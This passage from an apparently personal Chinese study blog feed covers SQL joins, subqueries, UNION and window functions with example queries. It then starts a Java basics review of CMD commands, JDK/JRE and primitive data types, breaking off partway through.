<p>使用 INNER JOIN 进行关联查询，根据员工表和部门表之间的公共字段 <code>部门名称（department）</code> 进行匹配，将员工的姓名、工资以及所属部门和部门经理组合在一起：</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> e.emp_name, e.salary, e.department, d.manager</span><br><span class="line"><span class="keyword">FROM</span> employees e</span><br><span class="line"><span class="keyword">JOIN</span> departments d <span class="keyword">ON</span> e.department <span class="operator">=</span> d.department;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">  S.name <span class="keyword">AS</span> student_name,</span><br><span class="line">  S.age <span class="keyword">AS</span> student_age,</span><br><span class="line">  C.id <span class="keyword">AS</span> class_id,</span><br><span class="line">  C.name <span class="keyword">AS</span> class_name,</span><br><span class="line">  C.level <span class="keyword">AS</span> class_level</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">  student S</span><br><span class="line">  <span class="keyword">JOIN</span> class C <span class="keyword">ON</span> S.class_id <span class="operator">=</span> C.id</span><br></pre></td></tr></table></figure>
<h3 id="22-查询进阶-关联查询-outer-join"><a class="header-anchor" href="#22-查询进阶-关联查询-outer-join">¶</a>22 查询进阶-关联查询-outer join</h3>
<ul>
<li>
<p>OUTER JOIN 是一种关联查询方式，它根据指定的关联条件，将两个表中满足条件的行组合在一起，并 <strong>包含没有匹配的行</strong></p>
</li>
<li>
<p>在 OUTER JOIN 中，包括 LEFT OUTER JOIN 和 RIGHT OUTER JOIN 两种类型，它们分别表示查询左表和右表的所有行（即使没有被匹配），再加上满足条件的交集部分</p>
</li>
<li>
<p>使用 LEFT JOIN 进行关联查询，根据员工表和部门表之间的部门名称进行匹配，将员工的姓名、工资以及所属部门和部门经理组合在一起，并包含所有员工的信息：</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> e.emp_name, e.salary, e.department, d.manager</span><br><span class="line"><span class="keyword">FROM</span> employees e</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> departments d <span class="keyword">ON</span> e.department <span class="operator">=</span> d.department;</span><br></pre></td></tr></table></figure>
<ul>
<li>有些数据库并不支持 RIGHT JOIN 语法，其实只需要把主表（from 后面的表）和关联表（LEFT JOIN 后面的表）顺序进行调换即可实现效果</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">  S.name <span class="keyword">AS</span> student_name,</span><br><span class="line">  S.age <span class="keyword">AS</span> student_age,</span><br><span class="line">  S.class_id <span class="keyword">AS</span> class_id,</span><br><span class="line">  C.name <span class="keyword">AS</span> class_name,</span><br><span class="line">  C.level <span class="keyword">AS</span> class_level</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">  student S</span><br><span class="line">  <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> class C <span class="keyword">ON</span> S.class_id <span class="operator">=</span> C.id</span><br></pre></td></tr></table></figure>
<h3 id="23-查询进阶-子查询"><a class="header-anchor" href="#23-查询进阶-子查询">¶</a>23 查询进阶-子查询</h3>
<ul>
<li>
<p>子查询是指在一个查询语句内部 <strong>嵌套</strong> 另一个完整的查询语句，内层查询被称为子查询。</p>
</li>
<li>
<p>子查询可以用于获取更复杂的查询结果或者用于过滤数据</p>
</li>
<li>
<p>数据库引擎会首先执行子查询，然后将其结果作为条件或数据源来执行外层查询</p>
</li>
<li>
<p>现在，我们希望查询出订单总金额 &gt; 200 的客户的姓名和他们的订单总金额，示例 SQL 如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 主查询</span></span><br><span class="line"><span class="keyword">SELECT</span> name, total_amount</span><br><span class="line"><span class="keyword">FROM</span> customers</span><br><span class="line"><span class="keyword">WHERE</span> customer_id <span class="keyword">IN</span> (</span><br><span class="line">    <span class="comment">-- 子查询</span></span><br><span class="line">    <span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> customer_id</span><br><span class="line">    <span class="keyword">FROM</span> orders</span><br><span class="line">    <span class="keyword">WHERE</span> total_amount <span class="operator">&gt;</span> <span class="number">200</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">  S.name <span class="keyword">AS</span> name,</span><br><span class="line">  S.score <span class="keyword">AS</span> score,</span><br><span class="line">  S.class_id <span class="keyword">AS</span> class_id</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">  student S</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">  class_id <span class="keyword">IN</span> (</span><br><span class="line">    <span class="keyword">select</span> <span class="keyword">distinct</span> id</span><br><span class="line">    <span class="keyword">from</span> class C</span><br><span class="line">    <span class="keyword">where</span> C.id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">  )</span><br></pre></td></tr></table></figure>
<h3 id="24-查询进阶-子查询-exists"><a class="header-anchor" href="#24-查询进阶-子查询-exists">¶</a>24 查询进阶-子查询-exists</h3>
<ul>
<li>
<p>子查询中的一种特殊类型是 “exists” 子查询，用于检查主查询的结果集是否存在满足条件的记录，它返回布尔值（True 或 False），而不返回实际的数据</p>
</li>
<li>
<p>现在，我们希望查询出 <strong>存在订单的</strong> 客户姓名和订单金额。</p>
<p>使用 exists 子查询的方式，SQL 代码如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 主查询</span></span><br><span class="line"><span class="keyword">SELECT</span> name, total_amount</span><br><span class="line"><span class="keyword">FROM</span> customers</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span> (</span><br><span class="line">    <span class="comment">-- 子查询</span></span><br><span class="line">    <span class="keyword">SELECT</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">FROM</span> orders</span><br><span class="line">    <span class="keyword">WHERE</span> orders.customer_id <span class="operator">=</span> customers.customer_id</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>和 exists 相对的是 not exists，用于查找不满足存在条件的记录</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">  name,</span><br><span class="line">  age,</span><br><span class="line">  class_id</span><br><span class="line"><span class="keyword">from</span> student S</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> (</span><br><span class="line">    <span class="keyword">select</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">from</span> class C</span><br><span class="line">    <span class="keyword">where</span> S.class_id <span class="operator">=</span> C.id</span><br><span class="line">  )</span><br></pre></td></tr></table></figure>
<h3 id="25-查询进阶-组合查询"><a class="header-anchor" href="#25-查询进阶-组合查询">¶</a>25 查询进阶-组合查询</h3>
<ul>
<li>
<p>组合查询是一种将多个 SELECT 查询结果合并在一起的查询操作。</p>
</li>
<li>
<p>包括两种常见的组合查询操作：UNION 和 UNION ALL</p>
<ul>
<li>UNION 操作：它用于将两个或多个查询的结果集合并， <strong>并去除重复的行</strong> 。即如果两个查询的结果有相同的行，则只保留一行。</li>
<li>UNION ALL 操作：它也用于将两个或多个查询的结果集合并， <strong>但不去除重复的行</strong> 。即如果两个查询的结果有相同的行，则全部保留。</li>
</ul>
</li>
<li>
<p>UNION 操作：</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name, age, department</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> name, age, department</span><br><span class="line"><span class="keyword">FROM</span> table2;</span><br></pre></td></tr></table></figure>
<ul>
<li>UNION ALL 操作：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- UNION ALL操作</span></span><br><span class="line"><span class="keyword">SELECT</span> name, age, department</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> name, age, department</span><br><span class="line"><span class="keyword">FROM</span> table2;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> S.name, S.age, S.score, S.class_id <span class="keyword">from</span> student S </span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span> </span><br><span class="line"><span class="keyword">select</span> SN.name, SN.age, SN.score, SN.class_id <span class="keyword">from</span> student_new SN </span><br></pre></td></tr></table></figure>
<h3 id="26-查询进阶-开窗函数-sum-over"><a class="header-anchor" href="#26-查询进阶-开窗函数-sum-over">¶</a>26 查询进阶-开窗函数-sum over</h3>
<ul>
<li>
<p>开窗函数是一种强大的查询工具，它允许我们在查询中进行对分组数据进行计算、 <strong>同时保留原始行的详细信息</strong></p>
</li>
<li>
<p>开窗函数可以与聚合函数（如 SUM、AVG、COUNT 等）结合使用，但与普通聚合函数不同，开窗函数不会导致结果集的行数减少</p>
</li>
<li>
<p>第一个开窗函数：sum over。</p>
<p>该函数用法为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">SUM</span>(计算字段名) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> 分组字段名)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>现在，我们希望计算每个客户的订单总金额，并显示每个订单的详细信息。</p>
<p>示例 SQL 如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    order_id, </span><br><span class="line">    customer_id, </span><br><span class="line">    order_date, </span><br><span class="line">    total_amount,</span><br><span class="line">    <span class="built_in">SUM</span>(total_amount) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> customer_id) <span class="keyword">AS</span> customer_total_amount</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    orders;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">  id,</span><br><span class="line">  name,</span><br><span class="line">  age,</span><br><span class="line">  score,</span><br><span class="line">  class_id,</span><br><span class="line">  <span class="built_in">AVG</span>(score) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> class_id) </span><br><span class="line">  <span class="keyword">AS</span> class_avg_score</span><br><span class="line"><span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<h3 id="27-查询进阶-开窗函数-sum-over-order-by"><a class="header-anchor" href="#27-查询进阶-开窗函数-sum-over-order-by">¶</a>27 查询进阶-开窗函数-sum over order by</h3>
<ul>
<li>
<p>sum over order by，可以实现同组内数据的 <strong>累加求和</strong> 。</p>
<p>示例用法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">SUM</span>(计算字段名) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> 分组字段名 <span class="keyword">ORDER</span> <span class="keyword">BY</span> 排序字段 排序规则)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>举一个应用场景：老师在每个班级里依次点名，每点到一个学生，老师都会记录当前已点到的学生们的分数总和。（？跟SUM有啥区别</p>
</li>
<li>
<p>计算每个客户的历史订单累计金额，并显示每个订单的详细信息。</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    order_id, </span><br><span class="line">    customer_id, </span><br><span class="line">    order_date, </span><br><span class="line">    total_amount,</span><br><span class="line">    <span class="built_in">SUM</span>(total_amount) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> customer_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> order_date <span class="keyword">ASC</span>) <span class="keyword">AS</span> cumulative_total_amount</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    orders;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, name, age, score, class_id, </span><br><span class="line">		<span class="built_in">SUM</span>(score) <span class="keyword">OVER</span> </span><br><span class="line">		(<span class="keyword">PARTITION</span> <span class="keyword">BY</span> class_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">ASC</span>) <span class="keyword">AS</span> class_sum_score </span><br><span class="line"><span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<ul>
<li>这个知识点有点不熟练ORZ</li>
</ul>
<h3 id="28-查询进阶-开窗函数-rank"><a class="header-anchor" href="#28-查询进阶-开窗函数-rank">¶</a>28 查询进阶-开窗函数-rank</h3>
<ul>
<li>
<p>开窗函数 Rank</p>
</li>
<li>
<p>Rank 开窗函数是 SQL 中一种用于对查询结果集中的行进行 <strong>排名</strong> 的开窗函数。它可以根据指定的列或表达式对结果集中的行进行排序，并为每一行分配一个排名。在排名过程中，相同的值将被赋予相同的排名，而不同的值将被赋予不同的排名。</p>
<blockquote>
<p>当存在并列（相同排序值）时，Rank 会跳过后续排名，并保留相同的排名。</p>
</blockquote>
<ul>
<li>
<p>Rank 开窗函数的常见用法是在查询结果中查找前几名（Top N）或排名最高的行。</p>
</li>
<li>
<p>Rank 开窗函数的语法如下：</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">RANK</span>() <span class="keyword">OVER</span> (</span><br><span class="line">  <span class="keyword">PARTITION</span> <span class="keyword">BY</span> 列名<span class="number">1</span>, 列名<span class="number">2</span>, ... <span class="comment">-- 可选，用于指定分组列</span></span><br><span class="line">  <span class="keyword">ORDER</span> <span class="keyword">BY</span> 列名<span class="number">3</span> [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], 列名<span class="number">4</span> [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], ... <span class="comment">-- 用于指定排序列及排序方式</span></span><br><span class="line">) <span class="keyword">AS</span> rank_column</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>其中，<code>PARTITION BY</code> 子句可选，用于指定分组列，将结果集按照指定列进行分组；<code>ORDER BY</code> 子句用于指定排序列及排序方式，决定了计算 Rank 时的排序规则。<code>AS rank_column</code> 用于指定生成的 Rank 排名列的别名。</p>
</li>
<li>
<p>为每个客户的订单按照订单金额降序排名，并显示每个订单的详细信息。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    order_id, </span><br><span class="line">    customer_id, </span><br><span class="line">    order_date, </span><br><span class="line">    total_amount,</span><br><span class="line">    <span class="built_in">RANK</span>() <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> customer_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> total_amount <span class="keyword">DESC</span>) <span class="keyword">AS</span> customer_rank</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    orders;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, name, age, score, class_id, <span class="built_in">RANK</span>() <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> class_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">DESC</span>) <span class="keyword">AS</span> ranking <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<h3 id="29-查询进阶-开窗函数-row-number"><a class="header-anchor" href="#29-查询进阶-开窗函数-row-number">¶</a>29 查询进阶-开窗函数-row_number</h3>
<ul>
<li>
<p>Row_Number 开窗函数是 SQL 中的一种用于为查询结果集中的每一行 <strong>分配唯一连续排名</strong> 的开窗函数</p>
</li>
<li>
<p>与之前讲到的 Rank 函数不同，Row_Number 函数为每一行都分配一个唯一的整数值，不管是否存在并列（相同排序值）的情况。每一行都有一个唯一的行号，从 1 开始连续递增。</p>
<p>Row_Number 开窗函数的语法如下（几乎和 Rank 函数一模一样）：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ROW_NUMBER</span>() <span class="keyword">OVER</span> (</span><br><span class="line">  <span class="keyword">PARTITION</span> <span class="keyword">BY</span> column1, column2, ... <span class="comment">-- 可选，用于指定分组列</span></span><br><span class="line">  <span class="keyword">ORDER</span> <span class="keyword">BY</span> column3 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], column4 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], ... <span class="comment">-- 用于指定排序列及排序方式</span></span><br><span class="line">) <span class="keyword">AS</span> row_number_column</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>其中，<code>PARTITION BY</code>子句可选，用于指定分组列，将结果集按照指定列进行分组。<code>ORDER BY</code> 子句用于指定排序列及排序方式，决定了计算 Row_Number 时的排序规则。<code>AS row_number_column</code> 用于指定生成的行号列的别名。</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, name, age, score, class_id, <span class="built_in">ROW_NUMBER</span>() <span class="keyword">OVER</span>(</span><br><span class="line">    <span class="keyword">PARTITION</span> <span class="keyword">BY</span> class_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">DESC</span></span><br><span class="line">) <span class="keyword">AS</span> row_number <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<h3 id="30-查询进阶-开窗函数-lag-lead"><a class="header-anchor" href="#30-查询进阶-开窗函数-lag-lead">¶</a>30 查询进阶-开窗函数-lag/lead</h3>
<p>开窗函数 Lag 和 Lead 的作用是获取在当前行之前或之后的行的值，这两个函数通常在需要<strong>比较相邻行</strong>数据或<strong>进行时间序列分析</strong>时非常有用。</p>
<ul>
<li>1）Lag 函数</li>
</ul>
<p>Lag 函数用于获取 <strong>当前行之前</strong> 的某一列的值。它可以帮助我们查看上一行的数据。</p>
<p>Lag 函数的语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">LAG</span>(column_name, <span class="keyword">offset</span>, default_value) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> partition_column <span class="keyword">ORDER</span> <span class="keyword">BY</span> sort_column)</span><br></pre></td></tr></table></figure>
<p>参数解释：</p>
<ul>
<li>
<p><code>column_name</code>：要获取值的列名。</p>
</li>
<li>
<p><code>offset</code>：表示要向上偏移的行数。例如，offset为1表示获取上一行的值，offset为2表示获取上两行的值，以此类推。</p>
</li>
<li>
<p><code>default_value</code>：可选参数，用于指定当没有前一行时的默认值。</p>
</li>
<li>
<p><code>PARTITION BY</code>和<code>ORDER BY</code>子句可选，用于分组和排序数据。</p>
</li>
<li>
<p>2）Lead 函数</p>
</li>
</ul>
<p>Lead 函数用于获取 <strong>当前行之后</strong> 的某一列的值。它可以帮助我们查看下一行的数据。</p>
<p>Lead 函数的语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">LEAD</span>(column_name, <span class="keyword">offset</span>, default_value) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> partition_column <span class="keyword">ORDER</span> <span class="keyword">BY</span> sort_column)</span><br></pre></td></tr></table></figure>
<p>参数解释：</p>
<ul>
<li>
<p><code>column_name</code>：要获取值的列名。</p>
</li>
<li>
<p><code>offset</code>：表示要向下偏移的行数。例如，offset为1表示获取下一行的值，offset为2表示获取下两行的值，以此类推。</p>
</li>
<li>
<p><code>default_value</code>：可选参数，用于指定当没有后一行时的默认值。</p>
</li>
<li>
<p><code>PARTITION BY</code>和<code>ORDER BY</code>子句可选，用于分组和排序数据。</p>
</li>
<li>
<p>例：查询每个学生的考试日期和上一次考试的成绩，以及下一次考试的成绩，示例 SQL 如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    student_id,</span><br><span class="line">    exam_date,</span><br><span class="line">    score,</span><br><span class="line">    <span class="built_in">LAG</span>(score, <span class="number">1</span>, <span class="keyword">NULL</span>) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> student_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> exam_date) <span class="keyword">AS</span> previous_score,</span><br><span class="line">    <span class="built_in">LEAD</span>(score, <span class="number">1</span>, <span class="keyword">NULL</span>) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> student_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> exam_date) <span class="keyword">AS</span> next_score</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    scores;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, name, age, score, class_id,</span><br><span class="line">        <span class="built_in">LAG</span>(name, <span class="number">1</span>, <span class="keyword">NULL</span>) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> class_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">DESC</span>) <span class="keyword">AS</span> prev_name,</span><br><span class="line">        <span class="built_in">LEAD</span>(name, <span class="number">1</span>, <span class="keyword">NULL</span>) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> class_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">DESC</span>) <span class="keyword">AS</span> next_name</span><br><span class="line"> <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<ul>
<li>P.S. 这题居然一次过，好感动T T</li>
</ul>
<h3 id="恭喜通关！"><a class="header-anchor" href="#恭喜通关！">¶</a>恭喜通关！</h3>
<h3 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h3>
<p>比第一次刷熟练多了，第一次刚学了一遍，后半部分都需要参考答案才能写出来，这回只有个别题卡了一下，其余的都挺顺利</p>
<p>复习SQL命令的好方式~</p>
]]></content>
      <categories>
        <category>notes</category>
        <category>SQL notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】坤础复习扫盲</title>
    <url>/2024/07/20/CS_Notes/Java/%E3%80%90Java%E3%80%91%E5%9D%A4%E7%A1%80%E5%A4%8D%E4%B9%A0%E6%89%AB%E7%9B%B2/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li>根据以下两份，只摘出其中还不会或者不太熟练的部分，额外关注一下</li>
<li>Java基础入门（上）.pdf</li>
</ul>
<p>文件还没上传处理，先放着</p>
<ul>
<li>Java基础入门（下）.pdf</li>
</ul>
<p>文件还没上传处理，先放着</p>
<h1>由此始</h1>
<h2 id="Day1-Java基础语法"><a class="header-anchor" href="#Day1-Java基础语法">¶</a>Day1 Java基础语法</h2>
<h3 id="常见CMD命令"><a class="header-anchor" href="#常见CMD命令">¶</a>常见CMD命令</h3>
<table>
<thead>
<tr>
<th>操作</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>盘符名称:</td>
<td>盘符切换。E:回⻋，表⽰切换到E盘。</td>
</tr>
<tr>
<td>dir</td>
<td>查看当前路径下的内容。</td>
</tr>
<tr>
<td>cd ⽬录</td>
<td>进⼊单级⽬录。cd itheima</td>
</tr>
<tr>
<td>cd …</td>
<td>回退到上⼀级⽬录。</td>
</tr>
<tr>
<td>cd ⽬录1\⽬录2…</td>
<td>进⼊多级⽬录。cd itheima\JavaSE</td>
</tr>
<tr>
<td>cd \</td>
<td>回退到盘符⽬录。</td>
</tr>
<tr>
<td>cls</td>
<td>清屏。</td>
</tr>
<tr>
<td>exit</td>
<td>退出命令提⽰符窗⼝。</td>
</tr>
</tbody>
</table>
<ul>
<li>CMD练习：<code>qq.exe</code>启动qq     hhhhhhh</li>
</ul>
<h3 id="环境变量"><a class="header-anchor" href="#环境变量">¶</a>环境变量</h3>
<ul>
<li>
<p>作⽤：如果我想要在<strong>CMD的任意⽬录下</strong>，都可以<strong>启动某⼀个软件</strong>，那么就可以把这个软件的路径配置到环境变量中的PATH⾥⾯。</p>
</li>
<li>
<p>在启动软件的时候，操作系统会先在<strong>当前路径</strong>下找，如果在当前录课没有再到<strong>环境变量的路径</strong>中去找。如果都找不到就提⽰⽆法启动。</p>
</li>
<li>
<p>在CMD中打开软件时，会先找当前路径，再找环境变量，在环境变量中是从上往下依次查找的，如果路径放在最上⾯查找的速度⽐较快。</p>
</li>
</ul>
<h3 id="Java版本"><a class="header-anchor" href="#Java版本">¶</a>Java版本</h3>
<ul>
<li>
<p>Java的版本<strong>向下兼容</strong>。新的版本只是在原有的基础上添加了⼀些新的功能⽽已。</p>
</li>
<li>
<p>举例：</p>
<ul>
<li>⽤8版本开发的代码，⽤11版本能运⾏吗？必须可以的。</li>
<li>⽤11版本开发的代码，⽤8版本能运⾏吗？不⼀定。</li>
<li>如果11版本开发的代码，没有⽤到9-11的新特性，那么⽤8是可以运⾏的。</li>
<li>如果11版本开发的代码，⽤到了9-11的新特性，那么⽤8就⽆法运⾏了。</li>
</ul>
</li>
</ul>
<h3 id="Java三大平台"><a class="header-anchor" href="#Java三大平台">¶</a>Java三大平台</h3>
<ul>
<li>JavaSE、JavaME、JavaEE</li>
</ul>
<h4 id="JavaSE"><a class="header-anchor" href="#JavaSE">¶</a>JavaSE</h4>
<p>是其他两个版本的基础</p>
<h4 id="JavaME"><a class="header-anchor" href="#JavaME">¶</a>JavaME</h4>
<p>Java语⾔的⼩型版，⽤于嵌⼊式消费类电⼦设备或者⼩型移动设备的开发。其中最为主要的还是⼩型移动设备的开发（⼿机）。渐渐的没落了，已经被安卓和IOS给替代了。但是，安卓也是可以⽤Java来开发的。</p>
<h4 id="JavaEE"><a class="header-anchor" href="#JavaEE">¶</a>JavaEE</h4>
<p>⽤于Web⽅向的⽹站开发（主要从事后台服务器的开发），在服务器领域，Java是当之⽆愧的⻰头⽼</p>
<p>⼤。</p>
<h3 id="Java主要特性"><a class="header-anchor" href="#Java主要特性">¶</a>Java主要特性</h3>
<ul>
<li>⾯向对象</li>
<li>安全性</li>
<li>多线程</li>
<li>简单易⽤</li>
<li>开源</li>
<li>跨平台</li>
</ul>
<h4 id="Java语言跨平台的原理"><a class="header-anchor" href="#Java语言跨平台的原理">¶</a>Java语言跨平台的原理</h4>
<ul>
<li>
<p>操作系统本⾝其实是不认识Java语⾔的。</p>
</li>
<li>
<p>但是针对于不同的操作系统，Java提供了不同的虚拟机。</p>
</li>
<li>
<p>虚拟机会把Java语⾔翻译成操作系统能看得懂的语⾔。</p>
</li>
<li>
<p>Java程序—javac编译→Class文件</p>
<ul>
<li>→Windows版JVM虚拟机</li>
<li>→Linux版JVM虚拟机</li>
<li>→MacOS版JVM虚拟机</li>
</ul>
</li>
</ul>
<h4 id="JRE和JDK"><a class="header-anchor" href="#JRE和JDK">¶</a>JRE和JDK</h4>
<ul>
<li>
<p>JVM（Java Virtual Machine），Java虚拟机</p>
</li>
<li>
<p>JRE（Java Runtime Environment），Java运⾏环境，包含了JVM和Java的核⼼类库（Java API）</p>
</li>
<li>
<p>JDK（Java Development Kit）称为Java开发⼯具，包含了JRE和开发⼯具</p>
</li>
</ul>
<p>———————————————————————————————————————</p>
<p>|											JDK															  |</p>
<p>|			JVM				核心类库			开发工具								|</p>
<p>|————————————————————————————————————|</p>
<p>———————————————————————————————————————</p>
<p>|											JRE															  |</p>
<p>|			JVM				核心类库			运行工具								|</p>
<p>|————————————————————————————————————|</p>
<ul>
<li>只需安装JDK即可，它包含了java的运⾏环境和虚拟机</li>
</ul>
<h2 id="Day2-Java基础语法"><a class="header-anchor" href="#Day2-Java基础语法">¶</a>Day2 Java基础语法</h2>
<h3 id="Java语言数据类型的分类"><a class="header-anchor" href="#Java语言数据类型的分类">¶</a>Java语言数据类型的分类</h3>
<ul>
<li>基本数据类型</li>
<li>引用数据类型（在面向对象阶段深入）</li>
</ul>
<h4 id="基础数据类型的四类八种"><a class="header-anchor" href="#基础数据类型的四类八种">¶</a>基础数据类型的四类八种</h4>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>关键字</th>
<th>内存占用</th>
<th>取值范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>整数</td>
<td>byte</td>
<td>1</td>
<td>负的2的7次⽅ ~ 2的7次⽅-1(-128~127)</td>
</tr>
<tr>
<td></td>
<td>short</td>
<td>2</td>
<td>负的2的15次⽅ ~ 2的15次⽅-1(-32768~32767)</td>
</tr>
<tr>
<td></td>
<td>int</td>
<td>4</td>
<td>负的2的31次⽅ ~ 2的31次⽅-1</td>
</tr>
<tr>
<td></td>
<td>long</td>
<td>8</td>
<td>负的2的63次⽅ ~ 2的63次⽅-1</td>
</tr>
<tr>
<td>浮点数</td>
<td>float</td>
<td>4</td>
<td>1.401298e-45 ~ 3.402823e+38</td>
</tr>
<tr>
<td></td>
<td>double</td>
<td>8</td>
<td>4.9000000e-324 ~ 1.797693e+308</td>
</tr>
<tr>
<td>字符</td>
<td>char</td>
<td>2</td>
<td>0-65535</td>
</tr>
<tr>
<td>布尔</td>
<td>boolean</td>
<td>1</td>
<td>true, false</td>
</tr>
</tbody>
</table>
<ul>
<li>Java中整数默认是int类型，浮点数默认是double类型</li>
<li>记忆以下几点：
<ul>
<li>byte 类型的取值范围：<code> -128 ~ 127</code></li>
